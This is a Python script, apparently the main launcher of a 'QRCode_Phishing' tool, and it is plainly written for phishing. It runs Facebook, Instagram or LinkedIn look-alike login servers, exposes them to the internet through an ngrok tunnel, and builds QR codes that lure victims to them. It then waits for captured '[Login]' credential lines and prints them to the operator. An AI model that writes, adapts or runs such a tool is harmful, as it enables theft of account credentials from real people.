#!/usr/bin/python3
import qrcode
from PIL import Image
from colorama import Fore,Style
import subprocess
import sys
import os
import requests
import time
#from pwn import *
import getpass

def checking():
    check=subprocess.run(["ngrok","--help"],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    if not check:
        #print(f"{Fore.BLUE}Ngrok is present{Style.RESET_ALL}")
    #else:
        print(f"{Fore.RED}Error: No ngrok{Style.RESET_ALL}",file=sys.stderr)
        sys.exit(1)
def run_ngrok():
    print(f"{Fore.MAGENTA}[+] Opening Ngrok!!!!!{Style.RESET_ALL}")
    ball=subprocess.Popen(["ngrok","http" ,"5000"],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    time.sleep(2)
    try:
        data=requests.get("http://127.0.0.1:4040/api/tunnels").json()
        #print(data['tunnels'][0]['public_url'])
        global public_url
        public_url=data['tunnels'][0]['public_url']
        #print(f"{Fore.GREEN}Your Phising website is hosted in :{Fore.RED}{public_url}{Style.RESET_ALL}")
    except Exception as e:
        print(f"Error:{e}")

def paste_terminal():
    qr=qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_H,
        box_size=10,
        border=4
    )
    qr.add_data(public_url)
    qr.make(fit=True)
    qr.print_ascii()
    #print(f"{Style.RESET_ALL}")
    
def Save_image():
    qr=qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_H,
        box_size=10,
        border=4
    )
    qr.add_data(public_url)
    qr.make(fit=True)

    script_path=os.path.dirname(os.path.abspath(__file__))
    logo_path=os.path.join(script_path,"images","logo.png")

    img_qr=qr.make_image(fill_color="green", back_color="black").convert('RGBA')
    logo=Image.open(logo_path).convert('RGBA')
    logo_size=60
    logo=logo.resize((logo_size,logo_size))

    position=((img_qr.size[0]-logo_size) // 2, (img_qr.size[1]-logo_size) // 2)

    img_qr.paste(logo,position,mask=logo)
    save_path=os.path.join(script_path,"images","Phishing.png")
    img_qr.save(save_path)
    print(f"[+] Your QRCode is inside path:{save_path}")
def banner2():
    ball=f"""{Fore.CYAN}Created By cape2060. Link-> https://github.com/cape2060/QRCode_Phishing.git
    Enter your choise to generate the QRCode for Phishing

    1). Facebook
    2). Instagram
    3). LinkedIn
    4). Exit{Style.RESET_ALL}
    """
    print(ball)
def banner1():
    call=f"""{Fore.RED}    
    ██████    ███████████   ███████████  █████       ███          █████     
  ███▒▒▒▒███ ▒▒███▒▒▒▒▒███ ▒▒███▒▒▒▒▒███▒▒███       ▒▒▒          ▒▒███      
 ███    ▒▒███ ▒███    ▒███  ▒███    ▒███ ▒███████   ████   █████  ▒███████  
▒███     ▒███ ▒██████████   ▒██████████  ▒███▒▒███ ▒▒███  ███▒▒   ▒███▒▒███ 
▒███   ██▒███ ▒███▒▒▒▒▒███  ▒███▒▒▒▒▒▒   ▒███ ▒███  ▒███ ▒▒█████  ▒███ ▒███ 
▒▒███ ▒▒████  ▒███    ▒███  ▒███         ▒███ ▒███  ▒███  ▒▒▒▒███ ▒███ ▒███ 
 ▒▒▒██████▒██ █████   █████ █████        ████ █████ █████ ██████  ████ █████
   ▒▒▒▒▒▒ ▒▒ ▒▒▒▒▒   ▒▒▒▒▒ ▒▒▒▒▒        ▒▒▒▒ ▒▒▒▒▒ ▒▒▒▒▒ ▒▒▒▒▒▒  ▒▒▒▒ ▒▒▒▒▒ 
                                                                            
                                                                            
                                                                            {Style.RESET_ALL}"""
    print(call)
def main():
    checking()
    print("\n\n")
    banner1()
    banner2()
    while True:
        text=input(">>> ")
        if text.lower()=="1":
            try:
                file_path=os.path.dirname(os.path.abspath(__file__))
                script_path=os.path.join(file_path,"Facebook","app.py")
                print(f"{Fore.MAGENTA}[+] Running Python Server!!!!!!{Style.RESET_ALL}")
                proc=subprocess.Popen(["python3",script_path],stdout=subprocess.PIPE,stderr=subprocess.DEVNULL,text=True)

                time.sleep(1)
                
                run_ngrok()

                choice=input(f"{Fore.GREEN}You want QRcode in terminal or Image:{Style.RESET_ALL}")
                
                print(f"{Fore.MAGENTA}[+] Generating QRCode!!!!!")
                time.sleep(2)
                if choice.lower()=="terminal":
                    paste_terminal()
                elif choice.lower()=="image":
                    Save_image()
                print("[+] Listening!!!!")
                while True:
                        
                    line=proc.stdout.readline().strip()
                    if line.startswith("[Login]"):
                        print(f"{line}")
                        time.sleep(5)
                        proc.terminate()
                        proc.wait()
                            
                        subprocess.run(["pkill","-f","app.py"])
                        subprocess.run(['pkill','ngrok'])
                        break
            except KeyboardInterrupt:
                subprocess.run(["pkill","ngrok"])
                subprocess.run(["pkill","-f","app.py"])
                print(f"{Fore.YELLOW}GOODBYE!!!!")
                sys.exit(1)
        if text.lower()=="2":
            try:
                file_path=os.path.dirname(os.path.abspath(__file__))
                script_path=os.path.join(file_path,"Instagram","app.py")
                print(f"{Fore.MAGENTA}[+] Running Python Server!!!!!!{Style.RESET_ALL}")
                proc=subprocess.Popen(["python3",script_path],stdout=subprocess.PIPE,stderr=subprocess.DEVNULL,text=True)
                time.sleep(1)
                run_ngrok()
                choice=input(f"{Fore.GREEN}You want QRCode in terminal or image:{Style.RESET_ALL}")
                print(f"{Fore.MAGENTA}[+] Generating QRCode!!!!!")
                time.sleep(2)
                if choice.lower() == "terminal":
                    paste_terminal()
                elif choice.lower() == "image":
                    Save_image()
                print(f"{Fore.MAGENTA}[+] Listening!!!!!")

                while True:
                    line=proc.stdout.readline().strip()
                    if line.startswith("[Login]"):
                        print(f"{line}")
                        time.sleep(5)
                        proc.terminate()
                        proc.wait()
                        
                        subprocess.run(["pkill","-f","app.py"])
                        subprocess.run(["pkill","ngrok"])  
                        break 
            except KeyboardInterrupt:
                subprocess.run(["pkill","-f","app.py"])
                subprocess.run(["pkill","ngrok"])
                print(f"{Fore.YELLOW}GOODBYE!!!")
                sys.exit(1)
        if text.lower()=="3":
            try:
                file_path=os.path.dirname(os.path.abspath(__file__))
                script_path=os.path.join(file_path,"LinkedIn","app.py")
                print(f"{Fore.MAGENTA}[+] Running Python Server!!!!!!")
                proc=subprocess.Popen(["python3",script_path],stdout=subprocess.PIPE,stderr=subprocess.DEVNULL,text=True)
                time.sleep(1)
                run_ngrok()
                choice=input(f"{Fore.GREEN}You want your QRCode in terminal or image:{Style.RESET_ALL}")
                print(f"{Fore.MAGENTA}[+] Generating QRCode!!!!!")
                time.sleep(2)
                if choice.lower()=="terminal":
                    paste_terminal()
                elif choice.lower() == "image":
                    Save_image()
                else:
                    print("[-] Please provide valid input.")                
                print("[+] Listening!!!!!")
                while True:
                    line=proc.stdout.readline().strip()
                    if line.startswith("[Login]"):
                        print(f"{line}")
                        time.sleep(5)
                        proc.terminate()
                        proc.wait()
                        subprocess.run(["pkill","ngrok"])
                        subprocess.run(["pkill","-f","app.py"])
                        break
            except KeyboardInterrupt:
                subprocess.run(["pkill","ngrok"])
                subprocess.run(["pkill","-f","app.py"])
                print(f"GOODBYE!!!")
                sys.exit(1)


        if text.lower() == "exit":
            print(f"{Fore.YELLOW}GOODBYE!!!!{Style.RESET_ALL}")
            subprocess.run(["pkill","-f","app.py"])
            subprocess.run(['pkill','ngrok'])
            sys.exit(1)
        if text.lower()=="4":
            print(f"{Fore.YELLOW}GOODBYE!!!!{Style.RESET_ALL}")
            subprocess.run(["pkill","-f","app.py"])
            subprocess.run(['pkill','ngrok'])
            sys.exit(1)


if __name__ == "__main__":
   
    main()
    subprocess(["pkill","-f","app.py"])
    subprocess.run(['pkill','ngrok'])